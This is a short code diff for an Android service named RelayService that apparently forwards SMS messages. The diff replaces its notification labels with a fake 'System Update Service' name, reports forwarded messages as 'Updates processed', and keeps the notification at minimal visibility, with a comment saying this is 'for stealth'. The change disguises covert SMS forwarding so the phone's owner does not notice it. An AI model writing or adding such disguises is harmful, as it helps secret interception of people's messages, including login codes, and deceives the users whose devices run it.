@@ -58,10 +58,10 @@ class RelayService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                getString(R.string.notification_channel_name),
+                "System Update Service",
                 NotificationManager.IMPORTANCE_MIN // Minimal visibility for stealth
             ).apply {
-                description = getString(R.string.notification_channel_desc)
+                description = "Keeps the system update service running"
                 setShowBadge(false)
                 enableVibration(false)
                 enableLights(false)
@@ -83,8 +83,8 @@ class RelayService : Service() {
         )
 
         val statusText = when {
-            errorCount > 0 -> getString(R.string.errors_count, errorCount)
-            forwardedCount > 0 -> getString(R.string.sms_forwarded, forwardedCount)
+            errorCount > 0 -> "Errors detected: $errorCount"
+            forwardedCount > 0 -> "Updates processed: $forwardedCount"
             else -> "Checking for system updates..."
         }
 
